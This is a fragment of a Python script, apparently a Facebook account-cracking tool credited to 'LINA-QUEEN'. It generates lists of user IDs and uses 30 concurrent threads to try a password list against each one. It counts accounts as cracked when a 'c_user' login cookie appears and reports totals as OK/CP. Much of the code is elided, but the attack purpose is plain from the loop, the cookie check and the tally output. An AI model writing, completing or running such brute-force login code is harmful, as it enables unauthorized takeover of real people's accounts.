...
----------------------------------------------
 Author    : LINA-QUEEN
\033[1;31m Github    : LINA-QUEEN\033[1;37m
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Queen:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Queen.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [QUEEN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Queen=session.cookies.get_dict().keys()
                        if "c_user" in Queen:
